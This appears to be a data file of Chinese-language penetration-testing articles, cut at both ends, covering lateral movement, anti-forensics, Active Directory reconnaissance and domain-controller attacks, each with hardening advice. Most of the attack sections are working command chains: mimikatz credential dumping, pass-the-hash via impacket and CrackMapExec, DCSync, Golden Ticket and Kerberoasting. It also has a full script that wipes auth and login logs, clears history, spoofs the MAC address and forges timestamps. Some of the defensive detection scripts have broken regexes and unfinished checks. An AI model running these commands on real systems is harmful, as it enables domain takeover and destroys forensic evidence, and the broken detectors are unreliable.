    common_suid = {
        "/usr/bin/passwd", "/usr/bin/sudo", "/usr/bin/su", "/usr/bin/chsh",
        "/usr/bin/newgrp", "/usr/bin/gpasswd", "/usr/bin/mount", "/usr/bin/umount",
        "/usr/bin/fusermount", "/usr/bin/pkexec"
    }
    try:
        suid_output = subprocess.check_output(
            ["find", "/", "-perm", "-4000", "-type", "f"],
            text=True, stderr=subprocess.DEVNULL
        )
        for f in suid_output.splitlines():
            if f not in common_suid:
                findings.append(f"[SUID] 非标准SUID文件: {f}")
    except subprocess.CalledProcessError:
        pass

    # 5. 检查 /etc/passwd 异常用户
    with open("/etc/passwd") as f:
        for line in f:
            parts = line.strip().split(":")
            if len(parts) >= 7 and parts[2] == "0" and parts[0] != "root":
                findings.append(f"[PASSWD] UID=0 的非root用户: {parts[0]}")

    return findings

if __name__ == "__main__":
    results = check_persistence()
    if results:
        print("[!] 发现持久化后门痕迹:")
        for r in results:
            print(f"    {r}")
    else:
        print("[*] 未发现明显持久化痕迹")
\`\`\`

## 安全加固

1. **SSH 安全配置**
   - 禁用密码认证，仅允许密钥登录
   - 使用 \`AllowUsers\` / \`AllowGroups\` 限制可登录用户
   - 配置 \`AuthorizedKeysCommand\` 集中管理公钥
   - 启用 SSH 日志记录：\`LogLevel VERBOSE\`

2. **Crontab 监控**
   - 定期审计所有用户的 crontab：\`for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done\`
   - 监控 crontab 文件变更：使用 inotifywait 或 AIDE
   - 限制 \`/etc/cron*\` 目录权限

3. **Systemd 服务安全**
   - 启用 \`systemd-analyze security\` 审计服务安全评分
   - 监控 \`/etc/systemd/system/\` 新增文件
   - 使用 \`ProtectSystem=strict\` 限制服务文件系统访问

4. **SUID 文件管理**
   - 定期使用 \`find / -perm -4000 -type f\` 审计 SUID 文件
   - 移除非必要的 SUID 位
   - 使用 AIDE 监控 SUID 文件变更

5. **文件完整性监控**
   - 部署 AIDE / Tripwire 监控关键文件
   - 监控 \`/etc/passwd\`、\`/etc/shadow\`、\`/etc/sudoers\` 变更
   - 启用 auditd 记录文件访问事件
    `
  },
  {
    slug: 'lateral-movement',
    title: '横向移动技术',
    date: '2026-06-06',
    category: 'attack-defense',
    subcategory: 'lateral',
    tags: ['渗透测试', '横向移动', '内网'],
    summary: '内网横向移动的常见方法和工具。',
    content: `
## 横向移动方法

### 1. IPC$ 命名管道

\`\`\`cmd
# 连接
net use \\\\target\\ipc$ "password" /user:administrator

# 复制文件
copy shell.exe \\\\target\\C$\\Windows\\Temp\\

# 执行
sc \\\\target create service binPath= "C:\\Windows\\Temp\\shell.exe"
\`\`\`

### 2. PsExec

\`\`\`cmd
psexec \\\\target -u admin -p pass cmd.exe
psexec \\\\target -u admin -p pass -c shell.exe
\`\`\`

### 3. WMI

\`\`\`cmd
wmic /node:target /user:admin /password:pass process call create "cmd.exe /c whoami > C:\\temp\\out.txt"
\`\`\`

### 4. WinRM

\`\`\`powershell
# 远程执行
Invoke-Command -ComputerName target -ScriptBlock { whoami }
\`\`\`

### 5. RDP

\`\`\`cmd
mstsc /v:target
xfreerdp /v:target /u:admin /p:pass
\`\`\`

### 6. SMB

\`\`\`cmd
# 使用 impacket
psexec.py admin:pass@target
wmiexec.py admin:pass@target
smbexec.py admin:pass@target
\`\`\`

### 7. Pass the Hash

\`\`\`cmd
# 使用 mimikatz 获取哈希
sekurlsa::logonpasswords

# 使用哈希连接
psexec.py -hashes aad3b435...:f1f4d... admin@target
\`\`\`

## 工具

- **Impacket**：Python 网络协议工具包
- **CrackMapExec**：批量内网渗透
- **BloodHound**：AD 环境分析
- **Responder**：LLMNR/NBT-NS 欺骗

## 检测

- 监控异常登录
- 检查日志中的横向移动特征
- 网络流量分析

## 实战案例

### 案例：从域用户凭据到域控的完整横向移动

\`\`\`
横向移动攻击路径：

┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│  初始 foothold│     │  域内任意主机  │     │   域控制器    │
│  192.168.1.50 │────→│  192.168.1.10 │────→│  192.168.1.1  │
└──────────────┘     └──────────────┘     └──────────────┘
       │                    │                     │
       │ Pass the Hash      │ WMI/SMB             │ DCSync
       │ 获取 NTLM 哈希      │ 横向移动             │ 获取 krbtgt
       ▼                    ▼                     ▼
  mimikatz 提取          impacket psexec         secretsdump
  sekurlsa::logonpasswords                      获取所有凭据
\`\`\`

\`\`\`bash
# 真实场景：从普通域主机横向移动到域控

# Step 1：在初始 foothold 上提取凭据
# Windows
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 输出示例：
# Authentication Id : 0 ; 324567 (00000000:0004f3c7)
# Session           : Interactive from 1
# User Name         : svc_sql
# Domain            : CORP
# Logon Server      : DC01
# NTLM    : 31d6cfe0d16ae931b73c59d7e0c089c0

# Step 2：验证凭据并横向移动
# 使用 impacket
impacket-psexec CORP/svc_sql@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# 或使用 CrackMapExec 批量测试
crackmapexec smb 192.168.1.0/24 -u svc_sql -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth

# Step 3：在目标主机上继续提取凭据
# 在 192.168.1.10 上执行
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 发现域管凭据：CORP/administrator
# NTLM: b4b9b02e6f09a9bb312324ccd0560

# Step 4：使用域管凭据横向移动到域控
impacket-psexec CORP/administrator@192.168.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324ccd0560

# Step 5：在域控上执行 DCSync
impacket-secretsdump CORP/administrator@192.168.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324ccd0560 -just-dc-ntlm
\`\`\`

\`\`\`python
# 使用 CrackMapExec 进行批量横向移动检测（防御方使用）

import subprocess
import json

def audit_lateral_movement(subnet, username, password=None, ntlm_hash=None):
    """
    模拟横向移动检测：批量测试域内凭据有效性
    防御方使用此脚本发现弱凭据复用
    """
    results = []

    # 使用 CrackMapExec 进行凭据喷洒检测
    cmd = ["crackmapexec", "smb", subnet, "-u", username]

    if ntlm_hash:
        cmd.extend(["-H", ntlm_hash])
    elif password:
        cmd.extend(["-p", password])
    else:
        return {"error": "必须提供密码或 NTLM 哈希"}

    cmd.extend(["--local-auth", "--json"])

    try:
        output = subprocess.check_output(cmd, text=True, timeout=300)
        for line in output.splitlines():
            try:
                result = json.loads(line)
                if result.get("cred_success"):
                    results.append({
                        "host": result["host"],
                        "status": "凭据有效 - 存在横向移动风险",
                        "username": username
                    })
            except json.JSONDecodeError:
                continue
    except subprocess.TimeoutExpired:
        return {"error": "扫描超时"}

    return {"vulnerable_hosts": results, "total": len(results)}

# 检测 Pass the Hash 可能性
def check_pth_risk(hosts_file):
    """
    检测哪些主机可能遭受 PTH 攻击
    检查 SMB 签名是否启用
    """
    cmd = ["crackmapexec", "smb", f"cidr:{hosts_file}",
           "--gen-relay-list", "/tmp/relays.txt", "-q"]

    try:
        subprocess.run(cmd, capture_output=True, timeout=300)
        with open("/tmp/relays.txt") as f:
            relay_hosts = [line.strip() for line in f if line.strip()]
        return {"pth_vulnerable": relay_hosts, "count": len(relay_hosts)}
    except Exception as e:
        return {"error": str(e)}

# 主函数
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("用法: python lateral_audit.py <subnet> <username> [password|ntlm_hash]")
        sys.exit(1)

    subnet = sys.argv[1]
    username = sys.argv[2]
    credential = sys.argv[3]

    if len(credential) == 32 and ":" not in credential:
        result = audit_lateral_movement(subnet, username, ntlm_hash=credential)
    else:
        result = audit_lateral_movement(subnet, username, password=credential)

    print(json.dumps(result, indent=2, ensure_ascii=False))
\`\`\`

## 安全加固

1. **凭据保护**
   - 启用 Credential Guard（Windows 10/11 & Server 2016+）
   - 使用 LAPS 管理本地管理员密码
   - 禁止域用户在多台主机上复用密码
   - 限制服务账户权限，避免使用高权限域账户运行服务

2. **网络分段**
   - 实施微分段（Micro-segmentation）隔离关键资产
   - 域控制器仅允许必要的管理流量
   - 启用 Windows 防火墙限制 445/135 等端口访问

3. **SMB 安全**
   - 启用 SMB 签名（Group Policy: Microsoft network server: Digitally sign communications）
   - 启用 SMB 加密
   - 禁用 NTLM，强制使用 Kerberos 认证

4. **日志监控**
   - 启用 4624（登录成功）/4625（登录失败）事件监控
   - 监控 Pass the Hash 特征：Event ID 4624 + Logon Type 3 + NTLM
   - 使用 SIEM 关联分析多主机登录异常
   - 部署微软 ATA / Azure ATP 检测异常认证行为

5. **权限最小化**
   - 域管理员账户不用于日常运维
   - 使用 PAM（特权访问管理）解决方案
   - 实施 Just-In-Time（JIT）特权提升
   - 监控 Domain Admins 组成员变更
    `
  },
  {
    slug: 'anti-forensics',
    title: '反溯源与日志清理',
    date: '2026-06-04',
    category: 'attack-defense',
    subcategory: 'anti-forensics',
    tags: ['渗透测试', '反溯源', '日志'],
    summary: '渗透测试中的反溯源技术日志清理方法。',
    content: `
## 反溯源方法

### 1. 使用代理/VPS

\`\`\`bash
# 使用 proxychains
proxychains nmap -sV target.com

# SSH 代理
ssh -D 1080 user@vps
\`\`\`

### 2. 修改 MAC 地址

\`\`\`bash
ifconfig eth0 hw ether 00:11:22:33:44:55
macchanger -r eth0
\`\`\`

### 3. 修改主机名

\`\`\`bash
hostnamectl set-hostname random-name
\`\`\`

### 4. 使用临时工具

\`\`\`bash
# 在 /tmp 下操作，重启后自动清理
cd /tmp
\`\`\`

## 日志清理

### Linux 日志

\`\`\`bash
# 清除登录日志
echo > /var/log/auth.log
echo > /var/log/secure

# 清除命令历史
history -c
unset HISTFILE
rm ~/.bash_history

# 清除特定日志条目
sed -i '/attacker_ip/d' /var/log/auth.log

# 清除 utmp/wtmp/btmp
echo > /var/log/wtmp
echo > /var/log/btmp
\`\`\`

### Windows 日志

\`\`\`powershell
# 清除安全日志
wevtutil cl Security

# 清除系统日志
wevtutil cl System

# 清除应用日志
wevtutil cl Application

# PowerShell 历史
Remove-Item (Get-PSReadLineOption).HistorySavePath
\`\`\`

## 时间戳修改

\`\`\`bash
# 修改文件时间戳
touch -r reference_file target_file
timestomp target_file -m "01/01/2020 00:00:00"
\`\`\`

## 注意事项

- 不要清理所有日志（会触发告警）
- 只删除特定条目
- 保留正常日志结构
- 注意文件时间戳

## 实战案例

### 案例：高级攻击者的反溯源操作流程

\`\`\`
攻击者反溯源操作流程：

┌──────────────┐
│  攻击基础设施 │  VPS / 代理链 / Tor
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  身份伪装     │  MAC 伪造 + 主机名随机化 + VPN
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  攻击执行     │  在 /tmp 目录下操作，不留痕迹
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  痕迹清理     │  选择性删除日志 + 时间戳伪造
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  安全撤离     │  断开连接，销毁临时工具
└──────────────┘
\`\`\`

\`\`\`bash
# 完整的反溯源操作脚本（教学演示）

#!/bin/bash
# === 阶段1：基础设施准备 ===

# 配置代理链
cat > /tmp/proxychains.conf << 'EOF'
[ProxyList]
socks5 127.0.0.1 1080
EOF

# 修改 MAC 地址
MAC_ADDRESS=$(printf '00:%02x:%02x:%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
ip link set dev eth0 down
ip link set dev eth0 address $MAC_ADDRESS
ip link set dev eth0 up
echo "[+] MAC 地址已修改为: $MAC_ADDRESS"

# 修改主机名
NEW_HOSTNAME=$(cat /usr/share/dict/words | shuf -n1)
hostnamectl set-hostname "$NEW_HOSTNAME"
echo "[+] 主机名已修改为: $NEW_HOSTNAME"

# === 阶段2：工作环境设置 ===

# 创建隐蔽工作目录
WORK_DIR="/tmp/.$(head -c 8 /dev/urandom | xxd -p)"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# 关闭命令历史记录
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
ln -sf /dev/null ~/.bash_history

# === 阶段3：操作执行 ===

# 所有工具在 WORK_DIR 中运行，不写入系统目录
# ... 执行渗透测试操作 ...

# === 阶段4：痕迹清理 ===

clean_traces() {
    # 清除登录日志中的特定条目
    if [ -f /var/log/auth.log ]; then
        ATTACKER_IP="10.10.14.5"
        sed -i "/$ATTACKER_IP/d" /var/log/auth.log
        # 保持日志结构完整
        chattr +a /var/log/auth.log
    fi

    # 清除 utmp/wtmp/btmp 中的记录
    > /var/log/wtmp
    > /var/log/btmp

    # 清除命令历史
    history -c
    history -w
    > ~/.bash_history

    # 清除 .ssh 目录中的后门公钥（如果是测试环境）
    # sed -i '/attacker_key/d' ~/.ssh/authorized_keys

    # 伪造时间戳
    REFERENCE_FILE="/etc/hostname"
    touch -r "$REFERENCE_FILE" "$WORK_DIR"/*

    # 销毁工作目录
    rm -rf "$WORK_DIR"

    # 恢复 MAC 地址（可选）
    ip link set dev eth0 down
    ip link set dev eth0 address original:mac:address
    ip link set dev eth0 up
}

# 确认后执行清理
echo "[*] 准备清理所有痕迹..."
clean_traces
echo "[+] 痕迹清理完成"
\`\`\`

\`\`\`python
# 防御检测：反溯源行为检测脚本

import os
import re
import subprocess
from datetime import datetime, timedelta

def detect_log_tampering():
    """检测日志是否被篡改"""
    findings = []

    log_files = {
        "/var/log/auth.log": ["auth", "sshd"],
        "/var/log/syslog": ["syslog"],
        "/var/log/wtmp": ["login"],
        "/var/log/btmp": ["failed_login"],
    }

    for log_path, keywords in log_files.items():
        if os.path.exists(log_path):
            stat = os.stat(log_path)

            # 检查文件大小是否异常小
            if stat.st_size < 100 and stat.st_size > 0:
                findings.append(f"[TAMPER] {log_path} 文件异常小 ({stat.st_size} bytes)，可能被清空")

            # 检查修改时间是否异常
            mtime = datetime.fromtimestamp(stat.st_mtime)
            if datetime.now() - mtime < timedelta(minutes=5):
                findings.append(f"[TAMPER] {log_path} 最近被修改: {mtime}")

            # 检查文件内容是否连续
            if log_path.endswith(".log"):
                with open(log_path, "rb") as f:
                    content = f.read()
                    # 检查是否有空洞（被选择性删除的痕迹）
                    lines = content.split(b"\n")
                    timestamps = []
                    for line in lines:
                        match = re.search(rb'w{3}s+d+s+d+:d+:d+', line)
                        if match:
                            timestamps.append(match.group())

    return findings

def detect_mac_spoofing():
    """检测 MAC 地址是否被伪造"""
    findings = []

    try:
        # 获取当前 MAC 地址
        result = subprocess.check_output(["ip", "link", "show", "eth0"], text=True)
        mac_match = re.search(r'link/ethers+([0-9a-fA-F:]{17})', result)
        if mac_match:
            current_mac = mac_match.group(1)

            # 检查是否是已知的常见伪造 MAC 前缀
            mac_vendor = current_mac[:8].upper()
            # 查看 /sys 中记录的实际 MAC
            with open("/sys/class/net/eth0/address") as f:
                real_mac = f.read().strip()

            if current_mac != real_mac:
                findings.append(f"[MAC] MAC 地址疑似伪造: 当前={current_mac}, 硬件={real_mac}")
    except Exception:
        pass

    return findings

def detect_history_tampering():
    """检测命令历史是否被清除"""
    findings = []

    bash_history = os.path.expanduser("~/.bash_history")
    if os.path.exists(bash_history):
        stat = os.stat(bash_history)
        if stat.st_size == 0:
            findings.append("[HISTORY] .bash_history 被清空")
        # 检查 HISTSIZE 环境变量
    else:
        findings.append("[HISTORY] .bash_history 文件不存在")

    # 检查 HISTFILE 是否被重定向
    histfile_link = os.path.islink(bash_history)
    if histfile_link:
        target = os.readlink(bash_history)
        findings.append(f"[HISTORY] .bash_history 是符号链接 -> {target}")

    return findings

if __name__ == "__main__":
    all_findings = []
    all_findings.extend(detect_log_tampering())
    all_findings.extend(detect_mac_spoofing())
    all_findings.extend(detect_history_tampering())

    if all_findings:
        print("[!] 发现反溯源痕迹:")
        for f in all_findings:
            print(f"    {f}")
    else:
        print("[*] 未发现明显反溯源痕迹")
\`\`\`

## 安全加固

1. **日志保护**
   - 部署集中日志服务器（ELK / Splunk / Syslog-ng），实时转发日志
   - 使用 append-only 模式配置日志文件（\`chattr +a\`）
   - 配置日志完整性监控（AIDE / OSSEC）
   - 使用 WORM（Write Once Read Many）存储关键日志

2. **网络监控**
   - 部署 NDR（Network Detection and Response）解决方案
   - 监控异常代理流量和 Tor 出口节点连接
   - 检测 MAC 地址变更和网络环境切换
   - 部署 NetFlow 分析检测异常流量模式

3. **端点检测**
   - 部署 EDR（Endpoint Detection and Response）
   - 监控命令历史清除行为（HISTFILE、HISTSIZE 变更）
   - 监控日志文件异常访问和修改
   - 启用 Sysmon 记录关键系统事件

4. **取证能力**
   - 实施内存取证方案（Volatility / LiME）
   - 保存网络流量全包数据（PCAP）
   - 部署全磁盘加密 + 远程解密密钥托管
   - 建立事件响应预案和取证检查清单
    `
  },
  // 域渗透 - 补充
  {
    slug: 'domain-recon',
    title: '域信息收集',
    date: '2026-05-24',
    category: 'domain',
    subcategory: 'domain-recon',
    tags: ['域渗透', '信息收集', 'Active Directory'],
    summary: '域环境下的信息收集方法和工具。',
    content: `
## 基本信息

\`\`\`powershell
# 当前域信息
net config workstation
nltest /dclist:domain.com
nltest /domain_trusts

# 域用户
net user /domain

# 域组
net group /domain
net group "Domain Admins" /domain

# 域控
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com
\`\`\`

## LDAP 查询

\`\`\`powershell
# 使用 ldapsearch
ldapsearch -x -h domain.com -b "DC=domain,DC=com"

# 使用 PowerShell
Get-ADUser -Filter * -Properties *
Get-ADComputer -Filter * -Properties *
Get-ADGroup -Filter *
\`\`\`

## BloodHound

\`\`\`bash
# 数据收集
bloodhound-python -u admin -p pass -d domain.com -c All

# SharpHound
./SharpHound.exe -c All
\`\`\`

## 常用工具

- **enum4linux**：SMB 枚举
- **ldapsearch**：LDAP 查询
- **BloodHound**：AD 路径分析
- **ADRecon**：AD 环境报告

## 信息收集内容

1. 域名、域 SID
2. 域控制器列表
3. 域用户和组
4. 信任关系
5. 共享资源
6. 策略配置

## 实战案例

### 案例：完整的 Active Directory 环境信息收集

\`\`\`
域信息收集流程：

┌──────────────┐
│  获取域信息    │  net config / nltest / nslookup
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  枚举用户/组   │  net user /domain + LDAP 查询
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  收集 SPN     │  Kerberoasting 前置信息收集
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  BloodHound   │  全面分析攻击路径
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  生成报告     │  识别高价值目标和攻击路径
└──────────────┘
\`\`\`

\`\`\`powershell
# 完整的域信息收集脚本

# === 1. 基础域信息 ===
Write-Host "\`n[*] ===== 域基础信息 =====" -ForegroundColor Cyan

# 当前用户和域信息
Write-Host "\`n[+] 当前登录信息:"
nltest /dsgetdc:$(Get-ADDomain).DNSRoot
net config workstation
whoami /all

# 域 SID
$domainSID = (Get-ADDomain).DomainSID.Value
Write-Host "[+] 域 SID: $domainSID"

# 域功能级别
$domain = Get-ADDomain
Write-Host "[+] 域功能级别: $($domain.DomainMode)"
Write-Host "[+] 林功能级别: $((Get-ADForest).ForestMode)"

# === 2. 域控制器枚举 ===
Write-Host "\`n[*] ===== 域控制器 =====" -ForegroundColor Cyan
Get-ADDomainController -Filter * | ForEach-Object {
    Write-Host "[+] DC: $($_.Name) | IP: $($_.IPv4Address) | OS: $($_.OperatingSystem)"
}

# DNS SRV 记录
nslookup -type=SRV _ldap._tcp.dc._msdcs.$(Get-ADDomain).DNSRoot

# === 3. 域用户枚举 ===
Write-Host "\`n[*] ===== 域用户 =====" -ForegroundColor Cyan
Get-ADUser -Filter * -Properties DisplayName, LastLogonDate, PasswordLastSet, Enabled |
    Where-Object { $_.Enabled -eq $true } |
    Select-Object Name, DisplayName, LastLogonDate, PasswordLastSet |
    Format-Table -AutoSize

# 查找不需要预认证的用户（AS-REP Roasting 目标）
Write-Host "\`n[+] 不需要预认证的用户（AS-REP Roasting）:" -ForegroundColor Yellow
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and Enabled -eq $true} |
    Select-Object Name, SamAccountName

# 查找有 SPN 的用户（Kerberoasting 目标）
Write-Host "\`n[+] 配置了 SPN 的用户（Kerberoasting）:" -ForegroundColor Yellow
Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and Enabled -eq $true} -Properties ServicePrincipalName |
    Select-Object Name, SamAccountName, ServicePrincipalName

# === 4. 域组枚举 ===
Write-Host "\`n[*] ===== 关键域组 =====" -ForegroundColor Cyan

$importantGroups = @(
    "Domain Admins",
    "Enterprise Admins",
    "Schema Admins",
    "Administrators",
    "Account Operators",
    "Server Operators",
    "Backup Operators",
    "DnsAdmins"
)

foreach ($group in $importantGroups) {
    $members = Get-ADGroupMember -Identity $group -ErrorAction SilentlyContinue
    if ($members) {
        Write-Host "\`n[+] $group 成员:" -ForegroundColor Yellow
        $members | ForEach-Object {
            Write-Host "    - $($_.Name) ($($_.objectClass))"
        }
    }
}

# === 5. 信任关系 ===
Write-Host "\`n[*] ===== 信任关系 =====" -ForegroundColor Cyan
Get-ADTrust -Filter * | ForEach-Object {
    Write-Host "[+] 信任: $($_.Name) | 方向: $($_.Direction) | 类型: $($_.TrustType)"
}

# === 6. 共享资源 ===
Write-Host "\`n[*] ===== 共享资源 =====" -ForegroundColor Cyan
Get-SmbShare | Where-Object { $_.Name -notmatch '^$' } |
    Select-Object Name, Path, Description

# === 7. 组策略枚举 ===
Write-Host "\`n[*] ===== 组策略 =====" -ForegroundColor Cyan
Get-GPO -All | Select-Object DisplayName, Id, CreationTime, ModificationTime |
    Format-Table -AutoSize

# === 8. 计算机枚举 ===
Write-Host "\`n[*] ===== 域计算机 =====" -ForegroundColor Cyan
Get-ADComputer -Filter * -Properties OperatingSystem, LastLogonDate |
    Select-Object Name, DNSHostName, OperatingSystem, LastLogonDate |
    Format-Table -AutoSize

# === BloodHound 数据收集 ===
# 使用 SharpHound 收集数据
# .SharpHound.exe -c All --zipfilename bloodhound_data.zip
# 或使用 bloodhound-python
# bloodhound-python -u user -p password -d corp.local -c All
\`\`\`

\`\`\`python
# LDAP 信息收集工具

import ldap3
import json
from datetime import datetime

class DomainRecon:
    def __init__(self, domain_controller, domain, username, password):
        self.dc = domain_controller
        self.domain = domain
        self.base_dn = ",".join([f"DC={d}" for d in domain.split(".")])
        self.server = ldap3.Server(domain_controller, get_info=ldap3.ALL)
        self.connection = ldap3.Connection(
            self.server,
            user=f"{username}@{domain}",
            password=password,
            authentication=ldap3.NTLM,
            auto_bind=True
        )

    def get_domain_info(self):
        """获取域基础信息"""
        self.connection.search(
            search_base=self.base_dn,
            search_filter="(objectClass=domain)",
            attributes=["distinguishedName", "objectSid", "dSCorePropagationData"]
        )
        return self.connection.entries

    def get_users(self, enabled_only=True):
        """枚举域用户"""
        search_filter = "(&(objectClass=user)(objectCategory=person))"
        if enabled_only:
            search_filter = f"(&{search_filter}(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

        self.connection.search(
            search_base=self.base_dn,
            search_filter=search_filter,
            attributes=["sAMAccountName", "displayName", "lastLogonTimestamp",
                       "pwdLastSet", "servicePrincipalName", "memberOf",
                       "userAccountControl"]
        )

        users = []
        for entry in self.connection.entries:
            uac = int(entry.userAccountControl.value) if entry.userAccountControl.value else 0
            users.append({
                "samaccountname": entry.sAMAccountName.value,
                "displayname": entry.displayName.value,
                "has_spn": bool(entry.servicePrincipalName.value),
                "no_preauth": bool(uac & 0x400000),
                "enabled": not bool(uac & 0x2),
                "last_logon": str(entry.lastLogonTimestamp.value) if entry.lastLogonTimestamp.value else "Never"
            })

        return users

    def get_groups(self):
        """枚举关键组"""
        important_groups = [
            "Domain Admins", "Enterprise Admins", "Schema Admins",
            "Administrators", "Account Operators", "DnsAdmins"
        ]

        results = {}
        for group_name in important_groups:
            self.connection.search(
                search_base=self.base_dn,
                search_filter=f"(&(objectClass=group)(cn={group_name}))",
                attributes=["cn", "member"]
            )
            if self.connection.entries:
                entry = self.connection.entries[0]
                results[group_name] = {
                    "members": entry.member.values if entry.member.value else []
                }

        return results

    def get_computers(self):
        """枚举域计算机"""
        self.connection.search(
            search_base=self.base_dn,
            search_filter="(objectClass=computer)",
            attributes=["cn", "dNSHostName", "operatingSystem", "operatingSystemVersion"]
        )

        computers = []
        for entry in self.connection.entries:
            computers.append({
                "name": entry.cn.value,
                "hostname": entry.dNSHostName.value if entry.dNSHostName.value else "",
                "os": entry.operatingSystem.value if entry.operatingSystem.value else "",
                "os_version": entry.operatingSystemVersion.value if entry.operatingSystemVersion.value else ""
            })

        return computers

    def generate_report(self):
        """生成收集报告"""
        report = {
            "timestamp": datetime.now().isoformat(),
            "domain": self.domain,
            "domain_info": str(self.get_domain_info()),
            "users": self.get_users(),
            "groups": self.get_groups(),
            "computers": self.get_computers()
        }

        # 统计
        users = report["users"]
        spn_users = [u for u in users if u["has_spn"]]
        no_preauth = [u for u in users if u["no_preauth"]]

        report["summary"] = {
            "total_users": len(users),
            "enabled_users": len([u for u in users if u["enabled"]]),
            "kerberoastable": len(spn_users),
            "asreproastable": len(no_preauth),
            "total_computers": len(report["computers"])
        }

        return report

if __name__ == "__main__":
    recon = DomainRecon(
        domain_controller="dc.corp.local",
        domain="corp.local",
        username="administrator",
        password="P@ssw0rd123"
    )

    report = recon.generate_report()
    print(json.dumps(report, indent=2, ensure_ascii=False, default=str))
\`\`\`

## 安全加固

1. **限制 LDAP 信息泄露**
   - 配置域控制器禁用匿名 LDAP 查询
   - 限制 \`Authenticated Users\` 组对敏感属性的读取权限
   - 启用 LDAP 签名和 LDAP channel binding

2. **用户账户保护**
   - 为所有服务账户设置复杂的长密码（>25 字符）
   - 避免服务账户的密码与管理员密码相同
   - 定期轮换服务账户密码，使用 gMSA（Group Managed Service Accounts）

3. **SPN 管理**
   - 审计和清理不必要的 SPN 记录
   - 使用 \`setspn -Q */*\` 检查 SPN 重复
   - 限制 \`ReadSPN\` 权限，阻止 Kerberoasting 信息收集

4. **BloodHound 防御**
   - 部署蜜罐用户账户，设置高价值 SPN 监控
   - 监控 SharpHound / BloodHound Python 的 LDAP 查询模式
   - 使用 Windows ATA / Azure ATP 检测目录侦察行为
    `
  },
  {
    slug: 'domain-attack',
    title: '域控攻击技术',
    date: '2026-05-23',
    category: 'domain',
    subcategory: 'domain-attack',
    tags: ['域渗透', '域控', 'Active Directory'],
    summary: '获取域控制器权限的常见方法。',
    content: `
## 域控攻击方法

### 1. Kerberoasting

\`\`\`powershell
# 请求服务票据
Add-Type -AssemblyName System.IdentityModel
$spns = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
foreach ($spn in $spns) {
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentName $spn.ServicePrincipalName
}

# 使用 Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
\`\`\`

### 2. AS-REP Roasting

\`\`\`powershell
# 查找不需要预认证的用户
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# 使用 Rubeus
Rubeus.exe asreproast /outfile:hashes.txt
\`\`\`

### 3. Pass the Hash

\`\`\`cmd
# 使用 mimikatz
sekurlsa::logonpasswords
lsadump::lsa /patch

# 使用 impacket
psexec.py -hashes aad3b435...:f1f4d... administrator@dc.domain.com
\`\`\`

### 4. DCSync

\`\`\`powershell
# 使用 mimikatz
lsadump::dcsync /user:krbtgt

# 使用 impacket
secretsdump.py domain/admin:pass@dc.domain.com -just-dc-ntlm
\`\`\`

### 5. Golden Ticket

\`\`\`powershell
# 需要 krbtgt 哈希
kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi
\`\`\`

## 防御

- 监控异常 SPN 请求
- 限制 DCSync 权限
- 定期更改 krbtgt 密码
- 启用 LAPS

## 实战案例

### 案例：从域用户到域控的完整攻击链

\`\`\`
域控攻击路径：

┌──────────────┐
│  普通域用户    │
└──────┬───────┘
       │
       ├──────────────────────────────┐
       ▼                              ▼
┌──────────────┐              ┌──────────────┐
│ Kerberoasting │              │ AS-REP       │
│ 获取服务票据   │              │ Roasting     │
└──────┬───────┘              └──────┬───────┘
       │ 离线破解 SPN 密码             │ 破解无预认证用户密码
       ▼                              ▼
┌──────────────┐              ┌──────────────┐
│ 获得服务账户   │              │ 获得用户凭据   │
│ 权限         │              │              │
└──────┬───────┘              └──────┬───────┘
       │                              │
       └──────────┬───────────────────┘
                  ▼
         ┌──────────────┐
         │  DCSync       │──→ 获取 krbtgt 哈希
         └──────┬───────┘
                ▼
         ┌──────────────┐
         │  Golden Ticket│──→ 域内任意身份伪造
         └──────────────┘
\`\`\`

\`\`\`powershell
# 完整的域控攻击链演示（授权红队测试环境）

# === 阶段1：Kerberoasting ===
Write-Host "[*] 执行 Kerberoasting 攻击..." -ForegroundColor Yellow

# 方法1：使用 Rubeus
.Rubeus.exe kerberoast /outfile:spn_hashes.txt /stat

# 方法2：PowerShell 手动请求
Add-Type -AssemblyName System.IdentityModel
$spns = Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and Enabled -eq $true} -Properties ServicePrincipalName, ServicePrincipalNames

foreach ($spn in $spns) {
    $spnName = $spn.ServicePrincipalName
    Write-Host "[*] 请求 SPN: $spnName"

    try {
        $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spnName
        $ticket = $token.GetRequest()
        # 保存 TGS 票据用于离线破解
        [System.IO.File]::WriteAllBytes("$PWD\tickets$($spn.SamAccountName).kirbi", $ticket)
    } catch {
        Write-Host "[-] 请求失败: $_" -ForegroundColor Red
    }
}

# 离线破解（使用 hashcat）
